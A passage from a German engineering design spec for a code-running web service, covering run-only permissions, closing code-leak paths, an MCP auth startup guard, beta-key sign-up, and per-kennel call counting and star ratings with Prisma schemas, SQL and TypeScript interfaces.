| NONE | `!canRun(dog)` (heute: Redaktion inkl. result) | id, Schloss | alles andere (unveraendert zu heute) |

`/api/nodes` (`NodesRouteHandler.ts:64-75`, `Controller.getById:224-243`): Projektion — bei RUN `theRun/lineDocs/serializedDogConfig` strippen; ACL-Felder (`editors/viewers/runners`) nur fuer Owner/Editors. `tsCodePreview` (`nodes.ts:97-99,112`) fuer RUN `null`.

#### 3.5.5 Jeder Weg, auf dem Code/Konfig ohne READ herausgeht (Nira 4, woertlich; Verschluss)

| # | Weg | Datei:Zeile | Heute | Verschluss |
|---|---|---|---|---|
| W1 | `/api/kennels/:id/run` volle Waves | `KennelRunHandler.ts:485`, `WavesConverter.ts:390,407-419` | redact bei `!canRead(dog)` inkl. result | Modus 3.5.4; Kennel-Gate auf `canRun` |
| W2 | `/execute`, `GET/POST /k/:id` | :509-532, 559-578, 598-619 | nur Lead-Result | Gate `canRun` statt `canRead` (RUN-Stufe) |
| W3 | MCP run_kennel/execute_kennel | `kennels.ts:632,678` | canRead + redact | wie W1/W2 |
| W4 | MCP Snapshot-Werkzeuge | `snapshots.ts:393-533,759-812` | P1 Commit 4 redigiert je Dog | Kennel-Gate `canRun`; Modus 3.5.4 in `loadVisibleSnapshot` |
| W5 | get_node / _lines / _versions / _schema | `nodes.ts:174,262,440,213` | canRead | bleibt; `get_node_schema` fuer RUN erlauben (Form ohne Code) |
| W6 | list_nodes tsCodePreview | `nodes.ts:97-99,112` | 200 Zeichen | RUN -> null |
| W7 | `GET /api/nodes` (liefert theRun) | `NodesRouteHandler.ts:64-75` | filterReadable, volle Entity | Projektion 3.5.4; `filterReadable` -> `filterRunnable` fuer Listen (W17: run-only sichtbar) |
| W8 | `GET /api/:sub/:id`, `/versions` | `ConfigRouteHandler.ts:217,527` | canRead | bleibt READ |
| W9 | get_kennel / _default_body / _default_query / _task / _layout / _versions | `kennels.ts:284-370` | canRead | bleibt READ; `get_kennel` fuer RUN gekuerzt auf `{id, lineageId, name, emoji, visibility, myRights, stats}` |
| W10 | Export | `KennelBundleHandler.ts:71,86-99` | P1 F1 (Stub) | Gate `canRead(kennel)`; Dogs unterhalb READ als Stub |
| W11 | Import | :143 | Login | ok; `visibility` aus Bundle nie ueber `private` hinaus ohne Owner-Wille (:278) |
| W12 | swagger.json / docs | `KennelSwaggerHandler.ts:30-47,100-107`, `swaggridAdapter.ts:23-26` | P1 F3 (canRead) | Gate `canRun`; defaults nur bei canRead; privat + !canRun -> 404 |
| W13 | Fehlermeldungen | `KennelRunHandler.ts:493,498,535,581`, `snapshots.ts:571`, `get_snapshot_errors` | Text roh | Dog-Fehler fuer `!canRead(dog)` -> `[redacted]`; `String(err)` nie mit Stack |
| W14 | Waves-Viewer UI | nutzt W1 | erbt | P6 U3: Silhouetten (Kennel-RUN), Schloss (Dog-RUN/NONE) |
| W15 | UI Clipboard-Export/Import | `kennel-list.component.ts:515-516,537-541` | ruft W10/W11 | erbt W10 |
| W16 | UI Version-Timeline / Side-Panel save -> /save | `version-timeline.component.ts:230`, `dog-side-panel.component.ts:276-286` | canMutateNode | ok; F5 in P1 |
| W17 | Landing/Listen | `ConfigRouteHandler.ts:187`, `list_kennels kennels.ts:265` | filterReadable | run-only-Entitaeten listen (Name/Emoji/Beschreibung), nicht verbergen (8.17) |
| W18 | list_collaborators | `acl.ts:235-267` | P1 F4 | bleibt |
| W19 | WebSocket-Lobby | `ChannelHub.ts:120-127` | kein Auth | ausserhalb dieses Modells (W22) |
| W20 | Legacy /save | `ConfigRouteHandler.ts:315-345` | P1 F5 | bleibt; spaeter /save nur Update (BACKLOG:83) |
| W21 | create_kennel/build_kennel/update_kennel mit fremden Dog-IDs | `kennels.ts:404,552-559,829`, `ConfigRouteHandler.ts:271,395-402` | canRead je neuer id | `canRun` je id; Version-Pin fuer run-only-Fremddogs (8.15) |
| W22 | save_node aus fremdem Code | `nodes.ts:383` | canMutateNode | ok (Bypass entfernt) |

#### 3.5.6 REST, MCP, Startup-Guard

REST (neu, `api/routes/AclRouteHandler.ts`, registriert wie `KennelRunHandler`; spiegelt `acl.ts`):

```
GET  /api/:sub/:id/acl                   -> 200 {ok, visibility, ownerId, editors[], viewers[], runners[], myRights:{run,read,edit,own}}   (Owner/Editor; andere 404)
PUT  /api/:sub/:id/acl  {visibility, editors[], viewers[], runners[]} -> 200 gleiche Form   (canManageAcl; 400 invalid_visibility | invalid_user)
POST /api/:sub/:id/acl/transfer {toUserId} -> 200                     (Owner)
```

`myRights` haengt zusaetzlich an `GET /api/kennels/:id`, `GET /api/nodes/:id`, `get_kennel`, `get_node` (UI braucht es fuer Chips `read only`, `run only`, Editor-Sperre).

MCP: `grant_access`/`revoke_access` um `role: 'runner'` erweitern; `role: 'reader'` als Alias von `viewer` (W18); `list_collaborators` gegated (P1). Texte 4.0 (P3.5-Zeilen).

Startup-Guard (Lotus, Commit 6): `main.ts` vor `createHttpApplication` (:195): wenn `NODE_ENV` in `['production','integration']` und `MCP_AUTH_REQUIRED !== 'true'` -> `console.error('[boot] MCP_AUTH_REQUIRED must be true in production/integration')`, `process.exit(78)` (EX_CONFIG). Dev bleibt offen und loggt einmal `[boot] superuser mode (MCP_AUTH_REQUIRED unset)`. Runbook P7 Schritt 3 setzt `MCP_AUTH_REQUIRED=true` (steht schon dort).

#### 3.5.7 Randfaelle

| Fall | Verhalten |
|---|---|
| Kennel run-only referenziert Dog private (fremd) | Kennel laeuft fuer Runner; der Dog laeuft im Owner-Kontext des Runners nicht — er hat kein RUN darauf -> Dog fehlt, `leadFailed`; Owner sieht den Grund. Referenz beim Save mit `canRun` je id verhindert das fuer neue dogIds; Altbestand bleibt (W21 prueft nur neue ids, `kennels.ts:552-559`). |
| Runner ist zugleich Viewer | hoechste Stufe gewinnt (READ). |
| Owner setzt sich selbst in `runners` | ignoriert (Owner ist OWN). |
| Community-Entitaet (8.16 = einfrieren) | READ fuer alle Eingeloggten, anonym: public-Regel; EDIT/OWN nur Superuser (dev) — Seeds bleiben ausfuehr- und lesbar, aber nicht mehr von jedem editierbar. |
| Version-Pin auf run-only-Fremddog, Autor loescht die Version | Lauf: Dog fehlt -> `leadFailed`; UI (P6) zeigt "pinned version gone". |
| Export eines Kennels mit run-only-Fremddog | Stub (P1 F1), Import warnt. |
| `myRights` fuer anonym auf public | `{run:true, read:true, edit:false, own:false}`. |

#### 3.5.8 Tests (Nira T1-T12, woertlich; StartupTest mit Fake-Usern)

- T1 anonym / privates Kennel: `GET /k/:id`, `/run`, `openapi.json`, `/docs`, export -> alle 404 (heute swagger 200 — F3).
- T2 anonym / run-only Kennel: `GET /k/:id` -> Lead-Result 200; `/run` -> Struktur ohne Identitaet (W17-Stufe 1); export -> 404; `get_kennel_default_body` (PAT-User ohne READ) -> not found.
- T3 runner-User / privater Dog X in eigenem Kennel: `create_kennel` mit X (Version-Pin) -> ok (canRun); `/run` -> X.result sichtbar, `X.codeTs` undefined; `get_node(X)` -> not found; `get_snapshot_dog_code(X)` -> redigiert.
- T4 viewer-User: alles aus T3 plus get_node/Versionen/Export -> ok; save_node -> Not authorized.
- T5 editor-User: save_node/update_kennel/rename -> ok; grant_access -> "Only the owner".
- T6 owner: alles; release_ownership -> community.
- T7 Agent mit PAT des Users U: identisch zu U; PAT ohne User -> MCP 401 (`mcp.ts:193`).
- T8 Superuser: `NODE_ENV=production` + `MCP_AUTH_REQUIRED` nicht `true` -> Prozess startet nicht (Exit 78); dev -> alles offen, geloggt.
- T9 Export-Kette (F1): P1 Test 6.
- T10 Fremder run-only-Dog laeuft in meinem Kennel: `keys`/Owner-jsonStore fuer diesen Dog nicht gebunden (jsonStore-Prefix `user:<ich>:dog:<lineage>:`); Referenz nur als Version-Pin akzeptiert (`update_kennel` mit lineageId eines run-only-Fremddogs -> 400 `pin_required`).
- T11 list_collaborators auf privates fremdes Kennel -> not found: P1 Test 8.
- T12 Legacy /save mit neuer id: P1 Test 9.

Abnahme: T1-T12 gruen; kein Pfad liefert `theRun`/`codeTs`/`vmContext`/defaults an eine Identitaet unterhalb READ (Harness grep ueber alle Antworten der Tests); `canRead` semantisch unveraendert (Diff von `visibility.ts:62-75` zeigt nur die neue Funktion `canRun`, keine Aenderung in `canRead`); `git grep -n "filterReadable"` an Listen-Stellen durch `filterRunnable` ersetzt (W17); `npm test` inkl. Doc-Lint gruen.

#### 3.5.9 Commit-Schnitt

1. `feat(acl): canRun + visibility run-only + runners-Spalte` — `visibility.ts`, Schema x2, `applyCreateDefaults`, `myRights`. T3 (Teil), T6.
2. (= P1 Commit 4+5) Lecks F1-F5.
3. `feat(run): Redaction-Modus (Kennel-RUN / Dog-RUN) in wavesRedaction, /api/nodes-Projektion, Fehlertext-Kuerzung, Gates auf canRun` — 3.5.4, W1-W13. T1, T2, T3, T4.
4. `feat(acl): runner-Rolle in MCP grant/revoke (+reader-Alias), REST /acl, Version-Pin fuer run-only-Fremddogs` — 3.5.6, W21. T5, T7, T10.
5. (= P6 U6) UI: Sichtbarkeits-Dreiwahl, Rechte-Panel, Silhouetten, Schloss.
6. `feat(boot): fail-closed Startup-Guard fuer MCP_AUTH_REQUIRED in production/integration` — T8.
7. `docs(mcp): Texte fuer P3.5` — 4.0.

Abhaengigkeiten: 3 <- 1; 4 <- 1; 6 unabhaengig; 7 zuletzt. P4 setzt 1 und 3 voraus (Rating-Gate `canRun`, W21).

#### 3.5.11 Closed Beta (2026-09-26, 10-0: "ein key ein google user")

- **Ein Schalter:** `SLOPDOGS_STAGE` (ein Wort, normalisiert auf `[a-z0-9-]`). `beta` setzt den Beta-Sticker der Landing (`LandingPage.withHost` fuellt `‹stage›` in `<html data-stage="…">`, Kennel-Ausgabe und Fallback gleich) und verlangt Beta-Keys — **nur mit** `MCP_AUTH_REQUIRED=true`. Lokal ohne Auth: Sticker ja, Keys nein.
- **Regel:** jedes Google-Konto muss einmal freigeschaltet sein — ein neues beim Anlegen, ein bestehendes beim naechsten Login (danach nie wieder). Ein Key schaltet genau ein Konto frei (`BetaKey.usedByUserId` unique), laeuft nicht ab, endet durch Einloesen oder Widerruf. Gespeichert: SHA-256-Hash, `last4`, Notiz, Anlegender, Zeitpunkte. Klartext genau einmal in der Antwort auf das Anlegen.
- **Ablauf:** `/login` (Feld "Beta key") bzw. die Key-Seite des Callbacks (`mcp/auth/beta-page.ts`, 403) -> `/auth/google/login?betaKey=` -> Session -> Callback: freigeschaltet -> hinein; sonst `BetaKeys.admit` in einer Transaktion (Nutzer anlegen/aktualisieren + bedingtes Update des Keys auf offen/nicht widerrufen; trifft es nichts, rollt der Nutzer zurueck). Gemessen gegen eine SQLite-Kopie: zwei gleichzeitige Anmeldungen mit einem Key -> ein Konto, die zweite `beta_key_used`.
- **Verwaltung:** `BETA_ADMIN_EMAILS` (auch production; kommen selbst ohne Key herein), lokal der Super-User. REST `GET /api/beta` (fuer alle), `GET/POST /api/beta/keys`, `DELETE /api/beta/keys/:id`; App `/account?tab=beta`.
- **Grenze:** geprueft wird beim Login. Eine laufende Session oder ein vorher ausgestelltes Token eines Bestandskontos gilt bis zu seinem Ablauf weiter (Session 7 Tage, PAT 1 Jahr) — wer das nicht will, widerruft Tokens bzw. setzt die Instanz neu auf (P7 frischer Start).
- **Schema:** Model `BetaKey` in `store/prisma-auth/schema.prisma`, `schema.postgres.prisma` und (Single-DB) `store/prisma/schema.postgres.prisma`; nach dem Update `prisma:sync`.
- **Tests:** StartupTest "Beta-Keys" (Einloesen einmal, zweites Konto abgewiesen, Bestandskonto schaltet frei, Widerruf, Wettlauf, Schalter nur mit Auth, Admins, REST 401/403/201) und "Beta-Sticker" (`data-stage` nur bei `beta`).

#### 3.5.10 Dateien

`mcp/auth/visibility.ts` · `mcp/auth/permissions.ts` · `store/prisma/schema.prisma`, `store/prisma/schema.postgres.prisma` · `services/wavesRedaction.ts` (aus P1) · `api/routes/KennelRunHandler.ts` · `api/routes/KennelSwaggerHandler.ts`, `services/swaggridAdapter.ts` · `api/routes/NodesRouteHandler.ts`, `api/Controller.ts`, `api/KennelController.ts`, `api/routes/ConfigRouteHandler.ts` · `api/routes/AclRouteHandler.ts` (neu) · `mcp/tools/acl.ts`, `kennels.ts`, `nodes.ts`, `snapshots.ts` · `main.ts` (Guard) · `mcp/skill.md`, `README.md`, `AISkill.md` · `StartupTest.ts`, `mcp-gateway.integration.cjs`. Nicht anfassen: `packages/core` (Rechte sind App-Schicht), `ui-app` (P6).

### P4 — Aufrufe, Sterne, Suche, Landing-API

**Ziel.** Jeder Kennel-Lauf wird an genau einer Stelle gezaehlt (`KennelRunHandler.runKennel`, `api/routes/KennelRunHandler.ts:104-134`, neun Aufrufstellen, alle hinter `canRead`), mit Quelle und Lead-Fehlermerkmal; Zaehler leben im Speicher und werden alle 30 s atomar in die DB geschrieben. Eingeloggte bewerten Kennels mit 1-5 Sternen (eine je Nutzer und Kennel; Owner und Editoren nicht). Liste, `get`, MCP `list_kennels`/`get_kennel` tragen `stats`; die Liste sortiert und filtert nach Aufrufen und Sternen. `GET /api/landing` liefert die zwei Ranglisten fuer die Landing aus einem 60-s-Memo. Amars Umsetzungs-Spezifikation ist hier woertlich uebernommen; Abweichungen: Public-Bremse ist P1 (W4), `url` statt `publicPath` im Landing-Vertrag (W2), `histogram` im Rating-Endpunkt (W8), sichtbare Zahl = `ranked30d` (W3), Ort des Rating-Widgets offen (W1).

#### 4.1 Prisma-Modelle (woertlich, in **beide** Dateien)

Dateien: `store/prisma/schema.prisma` (SQLite, dev) und `store/prisma/schema.postgres.prisma` (Postgres, Wahrheit auf integration — `scripts/run-prisma-sync.cjs:36-37, :60`). Text identisch, hinter `model Dog`.

```prisma
// Aufruf-Zaehler je Kennel-Lineage, Tag (UTC, 'YYYY-MM-DD') und Quelle. Reine Zaehler:
// keine IP, kein User-Agent, keine Identitaet. Keine FK auf Dog: die lineageId ist dort
// nicht eindeutig (jede Version traegt sie), und Kennel + Stats duerfen unabhaengig sterben.
model KennelCallDaily {
  lineageId  String
  day        String   // 'YYYY-MM-DD' in UTC — String, damit SQLite und Postgres gleich vergleichen
  source     String   // public | api-execute | mcp-execute | api-run | mcp-run | mcp-snapshot | mcp-build | swagger | unknown
  count      Int      @default(0)
  leadFailed Int      @default(0)   // Laeufe, deren Lead-Dog ein error-Brandzeichen trug

  @@id([lineageId, day, source])
  @@index([day])                    // 30-Tage-Fenster
}

// Eine Bewertung je Nutzer und Kennel-Lineage. userId = Auth-User.id (andere DB, keine FK).
model KennelRating {
  lineageId String
  userId    String
  stars     Int                      // 1..5, in der Anwendung geprueft
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt

  @@id([lineageId, userId])
}
```

Deploy: `render:integration:build` (`package.json:91`) -> `prisma:sync:integration` -> `prisma db push --accept-data-loss` (`run-prisma-sync.cjs:60`) legt beide Tabellen an; `start:integration:dist` (:85) ruft den Sync nochmal. Lokal `npm run prisma:sync`. Kein Migrationsordner, kein Backfill. Kein fuenfter PrismaClient — Pool-Budget 4 Clients x 4 Verbindungen (`scripts/dbEnv.cjs:283-289`); die neuen Tabellen haengen am Store-Client (`main.ts:60`).

#### 4.2 Store-Vertrag

Datei `store/IKennelStatsStore.ts` (neu), implementiert von `PrismaStore` (`class PrismaStore implements IStore, IKennelStatsStore`). `main.ts` reicht `store` als beides weiter.

```ts
export const KENNEL_CALL_SOURCES = [
    'public', 'api-execute', 'mcp-execute',                                 // "Nutzung" — rankt
    'api-run', 'mcp-run', 'mcp-snapshot', 'mcp-build', 'swagger', 'unknown', // gespeichert, rankt nicht
] as const;
export type KennelCallSource = typeof KENNEL_CALL_SOURCES[number];
/** Quellen, die in rankedTotal/ranked30d einfliessen. Einzige Stelle fuer diese Regel. */
export const RANKED_CALL_SOURCES: readonly KennelCallSource[] = ['public', 'api-execute', 'mcp-execute'];

export interface KennelCallDelta { lineageId: string; day: string; source: KennelCallSource; count: number; leadFailed: number; }
export interface KennelCallAggregate { lineageId: string; total: number; last30d: number; leadFailed: number; rankedTotal: number; ranked30d: number; }
export interface KennelRatingAggregate { lineageId: string; count: number; sum: number; }
export type KennelRatingHistogram = { 1: number; 2: number; 3: number; 4: number; 5: number };

export interface IKennelStatsStore {
    /** Addiert jede Delta-Zeile atomar auf (lineageId, day, source). Leeres Array = no-op. Wirft bei DB-Fehler (Aufrufer behaelt die Deltas). */
    incrementKennelCalls(deltas: KennelCallDelta[]): Promise<void>;
    /** Aggregate je Lineage. Ohne lineageIds: alle. Mit lineageIds: nur diese (fehlende -> Aufrufer nimmt 0). */
    readKennelCallAggregates(sinceDay: string, lineageIds?: string[]): Promise<KennelCallAggregate[]>;
    readKennelRatingAggregates(lineageIds?: string[]): Promise<KennelRatingAggregate[]>;
    /** Verteilung 1..5 fuer eine Lineage (nur Rating-Endpunkt). */
    readKennelRatingHistogram(lineageId: string): Promise<KennelRatingHistogram>;
    readKennelRating(lineageId: string, userId: string): Promise<number | null>;
    upsertKennelRating(lineageId: string, userId: string, stars: number): Promise<void>;
    deleteKennelRating(lineageId: string, userId: string): Promise<boolean>;
    /** Loescht alle Zaehler und Bewertungen der Lineage (Kennel-Delete). */
    deleteKennelStats(lineageId: string): Promise<void>;
}
```

SQL woertlich (`PrismaStore`, `this.prisma.$executeRaw` / `$queryRaw` mit `Prisma.sql`, Praezedenz `store/PrismaStore.ts:186-194`):

Upsert-Increment (ein Statement je Delta, alle Deltas eines Flushs in `this.prisma.$transaction([...])`):

```sql
INSERT INTO "KennelCallDaily" ("lineageId", "day", "source", "count", "leadFailed")
VALUES (${d.lineageId}, ${d.day}, ${d.source}, ${d.count}, ${d.leadFailed})
ON CONFLICT ("lineageId", "day", "source") DO UPDATE SET
  "count"      = "KennelCallDaily"."count"      + excluded."count",
  "leadFailed" = "KennelCallDaily"."leadFailed" + excluded."leadFailed"
```

SQLite >= 3.24 (Prisma 5.22 bundelt 3.4x) und Postgres schlucken das identisch; atomar auch bei zwei Prozessen (Deploy-Ueberlappung, `dbEnv.cjs:270-271`). Kein Prisma-`upsert` mit `increment`: ob daraus natives `ON CONFLICT` wird, ist versionsabhaengig; bei SELECT+INSERT gibt es P2002-Rennen.

Aufruf-Aggregate:

```sql
SELECT "lineageId",
       CAST(SUM("count") AS INTEGER)                                                         AS "total",
       CAST(SUM(CASE WHEN "day" >= ${sinceDay} THEN "count" ELSE 0 END) AS INTEGER)          AS "last30d",
       CAST(SUM("leadFailed") AS INTEGER)                                                    AS "leadFailed",
       CAST(SUM(CASE WHEN "source" IN (${Prisma.join(RANKED_CALL_SOURCES)}) THEN "count" ELSE 0 END) AS INTEGER) AS "rankedTotal",
       CAST(SUM(CASE WHEN "source" IN (${Prisma.join(RANKED_CALL_SOURCES)}) AND "day" >= ${sinceDay} THEN "count" ELSE 0 END) AS INTEGER) AS "ranked30d"
FROM "KennelCallDaily"
[WHERE "lineageId" IN (${Prisma.join(lineageIds)})]
GROUP BY "lineageId"
```

`CAST(... AS INTEGER)`: Postgres `SUM(integer)` liefert `bigint` -> Prisma `BigInt` (Praezedenz `Number(row.expiresAt)` `PrismaCacheHandler.ts:106`). Leere `lineageIds`-Liste -> sofort `[]`, kein Statement. String-Vergleich `"day" >= 'YYYY-MM-DD'` ist lexikographisch korrekt.

Rating-Aggregate und Histogramm:

```sql
SELECT "lineageId", CAST(COUNT(*) AS INTEGER) AS "count", CAST(SUM("stars") AS INTEGER) AS "sum"
FROM "KennelRating" [WHERE "lineageId" IN (${Prisma.join(lineageIds)})] GROUP BY "lineageId";

SELECT "stars", CAST(COUNT(*) AS INTEGER) AS "n" FROM "KennelRating" WHERE "lineageId" = ${lineageId} GROUP BY "stars";
```

Mittelwert in JS aus `sum/count` (Postgres `AVG` waere `numeric` -> Decimal). Einzelzeilen ueber den Prisma-Client:

```ts
readKennelRating:   this.prisma.kennelRating.findUnique({ where: { lineageId_userId: { lineageId, userId } }, select: { stars: true } })  -> row?.stars ?? null
upsertKennelRating: this.prisma.kennelRating.upsert({ where: { lineageId_userId: { lineageId, userId } }, create: { lineageId, userId, stars }, update: { stars } })
deleteKennelRating: (await this.prisma.kennelRating.deleteMany({ where: { lineageId, userId } })).count > 0
deleteKennelStats:  this.prisma.$transaction([ this.prisma.kennelCallDaily.deleteMany({ where: { lineageId } }), this.prisma.kennelRating.deleteMany({ where: { lineageId } }) ])
```

#### 4.3 KennelCallCounter

Datei `services/KennelCallCounter.ts`.

```ts
export interface KennelCallCounterOptions {
    flushIntervalMs?: number;   // Default env KENNEL_CALL_FLUSH_MS, sonst 30_000; 0 = kein Timer (Tests)
    maxPending?: number;        // Default env KENNEL_CALL_MAX_PENDING, sonst 10_000 Schluessel
    now?: () => Date;           // Testhaken fuer die Tagesgrenze
    onFlushed?: () => void;     // StatsService.invalidate()
}
export class KennelCallCounter {
    constructor(store: IKennelStatsStore, options?: KennelCallCounterOptions);
    /** Synchron, O(1), wirft nie. day = utcDay(now()). */
    record(lineageId: string, source: KennelCallSource, leadFailed: boolean): void;
    /** Ungeflushte Deltas als Aggregat je Lineage — Reads in dieser Instanz sind damit exakt. */
    pendingAggregates(sinceDay: string): Map<string, Omit<KennelCallAggregate, 'lineageId'>>;
    forget(lineageId: string): void;
    /** Idempotent, serialisiert, wirft nie; Fehler landet in lastFlushError, Deltas bleiben. */
    flush(): Promise<void>;
    start(): void;              // setInterval + unref (Muster PrismaCacheHandler.ts:73-84)
    stop(): Promise<void>;      // Timer aus + letzter Flush
    status(): { pending: number; dropped: number; lastFlushError: string | null };
}
export function utcDay(d: Date): string { return d.toISOString().slice(0, 10); }
```

`record`: Schluessel `lineageId + NUL + day + NUL + source`; neuer Schluessel bei `pending.size >= maxPending` -> `dropped++`, verwerfen (nie einen alten). `flush`: laufender Flush wird geteilt (`flushing`-Promise); Batch = `Array.from(pending.values())`, `pending.clear()`, `store.incrementKennelCalls(batch)`; bei Fehler Batch zurueckmergen (Deckel beachten), `console.warn('[KennelCallCounter] flush failed, N deltas retained: …')` (Log-Stufe nach `isCacheInfraError`-Muster `services/resilientCacheHandler.ts:15-22`), Retry beim naechsten Intervall; bei Erfolg `onFlushed()`.

Shutdown (`main.ts:244-279`, `registerGracefulShutdown`): `ShutdownTargets` bekommt `callCounter`; zwischen `httpServer.close()` (:259) und `Promise.allSettled([...disconnects])` (:261-265) kommt **sequenziell** `await targets.callCounter.stop();`. Not-Aus 10 s (:254-257) bleibt; `uncaughtException` (`main.ts:17-20`) flusht nicht — Verlust <= Intervall, akzeptiert (Amar-Empfehlung 5).

Env (in `.env.example` und `.env.integration.example`, Block "Heap-Budget und Speicher-Bremsen"):

```
# KENNEL_CALL_FLUSH_MS     — Abstand der Zaehler-Flushes in ms (Default 30000). Verlust bei SIGKILL <= dieser Wert.
# KENNEL_CALL_MAX_PENDING  — Deckel ungeflushter (Kennel,Tag,Quelle)-Schluessel im Speicher (Default 10000, gerechnet ~1 MB).
# KENNEL_STATS_MEMO_MS     — Lebensdauer des Aggregat-Memos fuer Listen/Einzelantworten (Default 30000).
# LANDING_MEMO_MS          — Lebensdauer des Landing-Memos (Default 60000).
```

#### 4.4 KennelStatsService

Datei `services/KennelStatsService.ts`.

```ts
export interface KennelStats {
    calls:  { total: number; last30d: number; leadFailed: number; ranked: number; ranked30d: number };
    rating: { avg: number | null; count: number; score: number };   // avg null bei count 0; score 0 bei count 0
}
export interface KennelRatingView extends KennelStats['rating'] { lineageId: string; histogram: KennelRatingHistogram; mine: number | null }
export class RatingError extends Error { constructor(readonly status: 400|401|403|404, readonly code: string, description?: string) }

export class KennelStatsService {
    static readonly BAYES_C = 5;
    static readonly WINDOW_DAYS = 30;
    constructor(store: IKennelStatsStore, counter: KennelCallCounter, memoMs = positiveIntFromEnv('KENNEL_STATS_MEMO_MS', 30_000));
    /** Haengt `stats` in place an (additiv wie lineageId/visibility in KennelController.parseEntity :727-734). Schluessel: k.lineageId ?? k.id. */
    attach<T extends { id: string; lineageId?: string }>(kennels: T[]): Promise<Array<T & { stats: KennelStats }>>;
    attachOne<T extends { id: string; lineageId?: string }>(kennel: T): Promise<T & { stats: KennelStats }>;
    ratingView(lineageId: string, userId: string | null): Promise<KennelRatingView>;
    /** Regeln Tabelle 4.4.1. Wirft RatingError. */
    setRating(kennel: AclEntity & { id: string; lineageId?: string }, ctx: AuthCtx, stars: unknown): Promise<KennelRatingView>;
    clearRating(kennel: AclEntity & { id: string; lineageId?: string }, ctx: AuthCtx): Promise<KennelRatingView>;
    invalidate(): void;
}
```

Memo: ein Objekt `{ at, sinceDay, calls: Map, ratings: Map, globalMean }` fuer alle Lineages (zwei GROUP-BY ohne WHERE); gueltig `memoMs`; Reload geteilt (Promise-Merken wie `createMimicAdopter` `KennelRunHandler.ts:184-190`); `counter.pendingAggregates(sinceDay)` wird addiert. `sinceDay = utcDay(now - 29 Tage)` (30 Kalendertage inkl. heute). Invalidierung nach Flush, Rating-Schreibzugriff, Kennel-Delete.

Bayes: `m` = globaler Mittelwert = `Σ sum / Σ count` ueber alle Rating-Aggregate; `C = 5`.

```
score(n, sum) = n === 0 ? 0 : (C * m + sum) / (C + n)
avg(n, sum)   = n === 0 ? null : sum / n
```

Rechenbeispiel (gerechnet, keine echten Daten): global 10 Bewertungen, Summe 38 -> m = 3,8. A: 1 Bewertung, 5 Sterne -> avg 5,0; score (19+5)/6 = **4,00**. B: 10 Bewertungen, Summe 45 -> avg 4,5; score (19+45)/15 = **4,27**. B rankt vor A. C ohne Bewertung: score 0, avg null. Rundung erst in der UI (eine Nachkommastelle, englisches Format "4.3", 8.13).

4.4.1 Rating-Regeln (Pruefreihenfolge):

| # | Bedingung | code | HTTP |
|---|---|---|---|
| 1 | Kennel nicht aufloesbar (`kennelsController.getById` !ok) | `not_found` | 404 |
| 2 | `!canRun(kennel, ctx)` (W21: bewertet wird, was man benutzen darf; `canRun` aus P3.5) | `not_found` (nichts verraten) | 404 |
| 3 | `!ctx.user` und `!ctx.isSuperUser` | `unauthorized` + `WWW-Authenticate` wie `ConfigRouteHandler.ts:16-27` | 401 |
| 3b | `ctx.isSuperUser && !ctx.user` (Dev-Modus, `middleware.ts:35-38`) | `no_identity` | 403 |
| 4 | `kennel.ownerId === ctx.user.id` | `owner_cannot_rate` | 403 |
| 5 | `parseList(kennel.editors).includes(ctx.user.id)` (`visibility.ts:31-35`) | `editor_cannot_rate` | 403 |
| 6 | `stars` nicht ganzzahlig in 1..5 (nur PUT; `"4"` als String ist ungueltig) | `invalid_stars` | 400 |
| 7 | sonst | upsert/delete, `invalidate()`, `ratingView` | 200 |

Community-Kennels (`ownerId null`, alle Seeds): Regeln 4/5 greifen nicht. Viewer privater Kennels bestehen Regel 2 und duerfen bewerten. Beim DELETE entfallen 4-6.

#### 4.5 Einbau in `runKennel` (`api/routes/KennelRunHandler.ts:104-134`)

`IKennelRunDeps` (:47-52) bekommt `callCounter: KennelCallCounter`.

```ts
export interface KennelRunAttribution { source: KennelCallSource }

public async runKennel(config, query?, body?, capabilityCtx?, vmTimeoutMs?, attribution?: KennelRunAttribution): Promise<Waves> {
    const lineageId = (config as any).lineageId || config.id;          // dieselbe Regel wie :157
    const source: KennelCallSource = attribution?.source ?? 'unknown';
    let leadFailed = false;
    try {
        const mimicAdopter = await this.createMimicAdopter(config);
        const kennelRun = new KennelRun(/* unveraendert :116-124 */);
        /* setCapabilityContext / setVmTimeoutMs unveraendert */
        const season = await kennelRun.run();
        await this.persistNewMimics(config, season.exhausted);
        const waves = convertSeasonToWaves(season, config);
        const leadRef = config.dogIds?.[0];
        leadFailed = !leadRef || !!(this.findDogInWaves(waves, leadRef)?.error);   // findDogInWaves :420-436
        return waves;
    } catch (err) {
        leadFailed = true;                                               // "Nothing to harvest" (harverster.ts:186) oder Infrastruktur
        throw err;
    } finally {
        this.deps.callCounter.record(lineageId, source, leadFailed);     // genau ein record je begonnenem Lauf
    }
}
```

Die neun Aufrufstellen und ihre Quelle:

| Aufrufstelle | source |
|---|---|
| `KennelRunHandler.ts:572` handlePublicGet (`/k/:id`) | `public` |
| `KennelRunHandler.ts:613` handlePublicPost | `public` |
| `KennelRunHandler.ts:525` handleExecute | `api-execute` |
| `KennelRunHandler.ts:484` handleRun | `api-run` |
| `KennelSwaggerHandler.ts:43` | `swagger` |
| `mcp/tools/kennels.ts:690` execute_kennel | `mcp-execute` |
| `mcp/tools/kennels.ts:642` run_kennel | `mcp-run` |
| `mcp/tools/kennels.ts:1038` build_kennel firstRun | `mcp-build` |
| `mcp/tools/snapshots.ts:244` refresh_kennel_snapshot | `mcp-snapshot` |

`/actions/<tool>` (`openapi.ts:181-212`) nutzt dieselben ToolDefs und erbt die MCP-Quelle. Bei `isRuntimeLogVerbose()` loggt der Handler jede `unknown`-Zaehlung mit Stack; Test 3 sichert, dass auf bekannten Wegen keine entsteht. Kein Aufruf: 503 der Bremse, 429 des MCP-Limiters, 401/404 vor canRead, `wait_for_*`/`get_*`-Werkzeuge (lesen nur den Cache), WS-Joins, StartupTest (`new KennelRun` direkt), HEAD, 308.

#### 4.6 REST-Vertraege

Fehlerform wie im Bestand: `{ "error": "<code>", "error_description"?: "<text>" }`.

`stats` an jeder Kennel-Antwort (`GET /api/kennels/:id` nur bei `subpath === 'kennels'`, Liste, MCP `get_kennel`, `list_kennels`):

```json
"stats": {
  "calls":  { "total": 1234, "last30d": 87, "leadFailed": 3, "ranked": 1100, "ranked30d": 80 },
  "rating": { "avg": 4.5, "count": 10, "score": 4.27 }
}
```

Nie fehlend, nie `null` als Objekt: ungerufen/unbewertet = `{"calls":{"total":0,"last30d":0,"leadFailed":0,"ranked":0,"ranked30d":0},"rating":{"avg":null,"count":0,"score":0}}`. Alle Beispielzahlen in diesem Abschnitt sind erfundene Formbeispiele, keine Messwerte.

